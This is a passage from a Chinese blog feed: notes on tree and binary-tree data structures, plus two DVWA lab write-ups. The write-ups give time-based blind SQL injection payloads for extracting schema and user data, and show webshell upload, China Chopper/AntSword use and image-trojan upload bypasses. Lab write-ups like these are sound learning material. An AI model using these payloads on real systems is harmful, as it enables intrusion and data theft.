<h2 id="查找效率分析"><a href="#查找效率分析" class="headerlink" title="查找效率分析"></a>查找效率分析</h2><p>查找成功的平均长度ASL<br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709233912561.png" alt></p>
<script type="math/tex; mode=display">
尽可能达到O(log_2n)</script><p>查找失败的平均查找长度<br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709234322040.png" alt></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>树和森林的遍历</title>
    <url>/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>树的先根后根层次遍历和森林的先序后序遍历的代码实现</p>
<span id="more"></span>
<h2 id="树和森林的遍历"><a href="#树和森林的遍历" class="headerlink" title="树和森林的遍历"></a>树和森林的遍历</h2><h3 id="树的先根遍历"><a href="#树的先根遍历" class="headerlink" title="树的先根遍历"></a>树的先根遍历</h3><p>若树非空，先访问根节点，再依次对每棵子树进行先根遍历</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(TreeNode *R)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(R!=null)&#123;</span><br><span class="line">        visit(R);</span><br><span class="line">        <span class="keyword">while</span>(R还有下一个子树T)</span><br><span class="line">            PreOrder(T);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>树的先根遍历与二叉树的先序遍历相同<br>深度优先遍历</p>
<h3 id="树的后根遍历"><a href="#树的后根遍历" class="headerlink" title="树的后根遍历"></a>树的后根遍历</h3><p><img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709230748352.png" alt></p>
<p>树的后根遍历与二叉树的中序遍历相同<br>深度优先遍历</p>
<h3 id="树的层次遍历"><a href="#树的层次遍历" class="headerlink" title="树的层次遍历"></a>树的层次遍历</h3><p><img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709231031413.png" alt><br>树的层次遍历与二叉树的层序遍历相同<br>广度优先遍历</p>
<h3 id="森林的先序遍历"><a href="#森林的先序遍历" class="headerlink" title="森林的先序遍历"></a>森林的先序遍历</h3><p> <img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709231345040.png" alt><br>可以先转换成二叉树，在对二叉树进行先序遍历</p>
<h3 id="森林的中序遍历"><a href="#森林的中序遍历" class="headerlink" title="森林的中序遍历"></a>森林的中序遍历</h3><p><img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709231520092.png" alt></p>
<p>可以先转换成二叉树，在对二叉树进行中序遍历<br><img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709231626512.png" alt></p>
<h2 id><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>sql时间盲注</title>
    <url>/2022/08/19/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>sql盲注中，给个true和false的可以使用布尔盲注，没有回显的就要使用时间盲注，前提是网络一定要好<br><span id="more"></span></p>
<p>首先要知道的函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sleep()<span class="operator">/</span>延迟函数</span><br><span class="line">if(<span class="keyword">condition</span>,<span class="literal">true</span>,<span class="literal">false</span>)<span class="operator">/</span>若条件为真 返回<span class="literal">true</span>，若条件为假 返回<span class="literal">false</span></span><br><span class="line"><span class="built_in">substring</span>(&quot;string&quot;,strart,length)</span><br></pre></td></tr></table></figure>
<h3 id="数据库名长"><a href="#数据库名长" class="headerlink" title="数据库名长"></a>数据库名长</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())&gt;X,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
<p>如果数据库名长大于X返回1否则睡十秒</p>
<h3 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h3><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; <span class="keyword">and</span> <span class="keyword">if</span>((ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)))&gt;X,<span class="number">1</span>,sleep(<span class="number">10</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>二分法或者爆破法，请参考<a href="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/" title="SQL盲注">SQL布尔盲注</a></p>
<h3 id="表的个数"><a href="#表的个数" class="headerlink" title="表的个数"></a>表的个数</h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">？id=<span class="number">1&#x27;</span> <span class="function"><span class="keyword">and</span> <span class="title">if</span>(<span class="params">(<span class="keyword">select</span> count(*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=’dvwa’ limit <span class="number">0</span>,<span class="number">1</span>)=X,<span class="number">1</span>,sleep(<span class="number">10</span>))<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<h3 id="表名长度"><a href="#表名长度" class="headerlink" title="表名长度"></a>表名长度</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">？<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((select table_name <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=’dvwa’ limit 0,1),A,1))&gt;X，1，sleep(10))#</span><br></pre></td></tr></table></figure>
<h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if((ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))&gt;X,<span class="number">1</span>,sleep(<span class="number">10</span>))--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="字段的数量"><a href="#字段的数量" class="headerlink" title="字段的数量"></a>字段的数量</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> count(*) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=’users’)=X,<span class="number">1</span>,sleep(<span class="number">10</span>)#</span><br></pre></td></tr></table></figure>
<h3 id="字段长"><a href="#字段长" class="headerlink" title="字段长"></a>字段长</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(length(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=’users’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br></pre></td></tr></table></figure>
<h3 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=’users’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br></pre></td></tr></table></figure>
<h3 id="字段值"><a href="#字段值" class="headerlink" title="字段值"></a>字段值</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">查询<span class="keyword">user</span>字段的数据</span><br><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> count(*) <span class="keyword">from</span> users)=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br><span class="line">查询第一个数据的长度</span><br><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(length(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br><span class="line">爆出第一个数据值</span><br><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=X,<span class="number">1</span>,sleep(<span class="number">10</span>))#</span><br></pre></td></tr></table></figure>
<p>可以看到时间盲注相比于布尔盲注只是多了一个if函数来执行sleep函数代替回显。</p>
]]></content>
      <tags>
        <tag>网络攻防</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞和中国剑蚁、菜刀的使用</title>
    <url>/2022/08/19/uploadfile/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本来是想起来原来写题的时候因为连不上剑蚁差点原地升天，后来在学习小马的时候就改用菜刀，顺带连了一下剑蚁结果可以了，都到这了顺带就给dvwa的文件上传部分通关了，本篇是靶场通关和工具使用记录，文件上传漏洞具体学习在码了，剑蚁和菜刀可以到下文链接下载</p>
<span id="more"></span>
<p>打开dvwa的文件上传漏洞靶场，上传小马<br><img src="/2022/08/19/uploadfile/image-20220819094509669.png" alt><br>1.php内容为：<br><img src="/2022/08/19/uploadfile/image-20220819094628330.png" alt><br>所以密码是pass</p>
<p>菜刀和剑蚁会有报错提示，可能唰一下就删掉了，推荐安虚拟机上<br>下载地址：<a href="https://github.com/gjy20001003/resourse">loveakali.github.io</a></p>
<h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><p><img src="/2022/08/19/uploadfile/image-20220819094852775.png" alt><br>地址要精确到你上传的webshell文件的地址，地址后面是你的密码，语言最好选utf-8吧，不然可能报错。<br><img src="/2022/08/19/uploadfile/image-20220819095015883.png" alt><br>然后点击文件管理就ok了<br><img src="/2022/08/19/uploadfile/image-20220819095043227.png" alt><br><img src="/2022/08/19/uploadfile/image-20220819095100873.png" alt><br>清晰，只能说写菜刀的人真滴nb。</p>
<p>关于菜刀的其他配置<br>如果知道数据库的话还可以把数据库拉过来一起管理，就是在配置那一栏填写如下代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">T</span>&gt;</span>数据库类型<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H</span>&gt;</span>主机名称<span class="tag">&lt;/<span class="name">H</span>&gt;</span>		eg：localhost</span><br><span class="line"><span class="tag">&lt;<span class="name">U</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">U</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">P</span>&gt;</span>		</span><br></pre></td></tr></table></figure>
<p>密码可以通过sql注入获得，可见<a href="/2022/08/17/sql%E6%B3%A8%E5%85%A5/" title="sql注入">sql注入</a><img src="/2022/08/19/uploadfile/image-20220819100026152.png" alt></p>
<p><img src="/2022/08/19/uploadfile/image-20220819100127232.png" alt><br>注：在配置旁边的输入栏可以自己手写sql语句来执行，要点执行。</p>
<h3 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h3><p>扫一下自己的博客，会返回一个ip地址<br><img src="/2022/08/19/uploadfile/image-20220819101224764.png" alt></p>
<p>爬取一下自己的博客<br><img src="/2022/08/19/uploadfile/image-20220819102045443.png" alt><br>回到菜刀的目录看到了多了一个文件夹叫做loveakali.top<br><img src="/2022/08/19/uploadfile/image-20220819102130301.png" alt><br>可以看到整个网站都被爬下来了，内容也可以显示<br><img src="/2022/08/19/uploadfile/image-20220819102443133.png" alt></p>
<h3 id="虚拟终端"><a href="#虚拟终端" class="headerlink" title="虚拟终端"></a>虚拟终端</h3><p>执行cmd命令set，能否得到回显，如果可以证明虚拟终端功能可用<img src="/2022/08/19/uploadfile/image-20220819102723914.png" alt><br>之后只要是在你权限下的命令就都可以执行了，当然也可以通过命令注入等手段提升权限。</p>
<h2 id="剑蚁"><a href="#剑蚁" class="headerlink" title="剑蚁"></a>剑蚁</h2><p><img src="/2022/08/19/uploadfile/image-20220819103011296.png" alt><br>可以看到绝大多数功能和才到差不多，不过多了一个插件市场可以下载自己想要的插件<br>数据操作就是数据库管理<br><img src="/2022/08/19/uploadfile/image-20220819103122128.png" alt></p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看源代码发现没有对上传的文件进行任何验证。<br><img src="/2022/08/19/uploadfile/image-20220819133948208.png" alt><br>可以看到成功了，然后用菜刀或者剑蚁都可以看到其他文件</p>
<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>对文件后缀名进行了验证，在if语句中判断上传的文件类型是不是jpg或者png文件和大小是否小于100kb<br>在过程中抓包并修改文件类型，即将Content-Type中application/octet-stream改为image/png或image/igep<br><img src="/2022/08/19/uploadfile/image-20220819134658297.png" alt><br><img src="/2022/08/19/uploadfile/image-20220819134746885.png" alt><br>或者<br><img src="/2022/08/19/uploadfile/image-20220819150331886.png" alt><br><img src="/2022/08/19/uploadfile/image-20220819150402250.png" alt></p>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>源代码中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>( <span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>将输出文件名.后所有信息然后送去if语句验证。同时使用getimagesize()函数限制了上传文件的文件头必须是图像类型。<br>那就先做一个图片马<br><img src="/2022/08/19/uploadfile/image-20220819141118474.png" alt><br>b表示二进制文件，a表示ascll码文件<br>图片马就制作好了，看起来平平无奇谁能想到里面藏着木马呢<br><img src="/2022/08/19/uploadfile/image-20220819141342629.png" style="zoom:50%;"></p>
<p>抓个包看看，在图片的末尾也看到了，可惜菜刀和剑蚁连不上应该是无法解析图片的问题<br><img src="/2022/08/19/uploadfile/image-20220819143008852-16608940380672.png" alt><br>成功上传<br><img src="/2022/08/19/uploadfile/image-20220819142200672-16608940336041.png" alt></p>
<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$target_file</span>   =  <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"><span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br></pre></td></tr></table></figure>
<p>使用md5重命名防止截断跳过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br></pre></td></tr></table></figure>
<p>加入Anti-CSRF token防护CSRF攻击</p>
]]></content>
      <tags>
        <tag>网络攻防</tag>
        <tag>工具</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>树的逻辑结构</title>
    <url>/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>使用双亲表示法孩子表示法以及孩子兄弟表示法表示树的逻辑结构，以及森林和二叉树的转换。</p>
<span id="more"></span>
<h2 id="树的逻辑结构"><a href="#树的逻辑结构" class="headerlink" title="树的逻辑结构"></a>树的逻辑结构</h2><h3 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h3><p><img src="/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/image-20220709211533787.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TREE_SIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="type">int</span> parent;</span><br><span class="line">&#125;PTNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    PTNode nodes[MAX_TREE_SIZE];</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">&#125;PTree;</span><br></pre></td></tr></table></figure>
<h3 id="孩子表示法"><a href="#孩子表示法" class="headerlink" title="孩子表示法"></a>孩子表示法</h3><p><img src="/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/image-20220709212419211.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> child;   <span class="comment">//孩子结点在数组中的位置</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">next</span>;</span>   <span class="comment">//下一个改组</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">fistchild</span>;</span> <span class="comment">//第一个孩子</span></span><br><span class="line">&#125; CTBox;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    CTBox nodes[MAX_TREE_SIZE];</span><br><span class="line">    <span class="type">int</span> n,r    <span class="comment">//结点数和根的位置</span></span><br><span class="line">&#125;CTree</span><br></pre></td></tr></table></figure>
<h3 id="孩子兄弟表示法"><a href="#孩子兄弟表示法" class="headerlink" title="孩子兄弟表示法"></a>孩子兄弟表示法</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span>&#123;</span></span><br><span class="line">    ElemType data;   <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span> *<span class="title">firstchild</span>,*<span class="title">nextsibling</span>;</span>  <span class="comment">//第一个孩子和右兄弟指针</span></span><br><span class="line">&#125;CSNode,*CSTree</span><br></pre></td></tr></table></figure>
<h3 id="森林和二叉树的转换"><a href="#森林和二叉树的转换" class="headerlink" title="森林和二叉树的转换"></a>森林和二叉树的转换</h3><p><img src="/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/image-20220709213548106.png" alt><br><img src="/2022/08/18/%E6%A0%91%E7%9A%84%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/image-20220709213700619.png" alt="image-20220709213700619"></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>线索二叉树</title>
    <url>/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>构建线索二叉树以及通过先序中序后序遍历查找线索二叉树的前驱后继</p>
<span id="more"></span>
<h2 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h2><p>普通二叉树不能从任意一个指定结点开始遍历<br><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709200423798.png" alt></p>
<h3 id="线索二叉树-1"><a href="#线索二叉树-1" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709200709261.png" alt><br><img src="/2022/08/18/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709200930693.png" alt></p>
<h3 id="土办法找前驱"><a href="#土办法找前驱" class="headerlink" title="土办法找前驱"></a>土办法找前驱</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//辅助全局变量，用于查找结点p的前驱</span></span><br><span class="line">BiTNode *p;</span><br><span class="line">BiTNode *pre=null;</span><br><span class="line">BiTNode *final-null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InOrder(T-&gt;lchild);</span><br><span class="line">        visit(T);</span><br><span class="line">        InOrder(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问结点q</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">(BiTNode *q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q==p)</span><br><span class="line">        final = pre;     <span class="comment">//找到p的前驱</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        pre = q;       <span class="comment">//pre指向当前访问的结点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
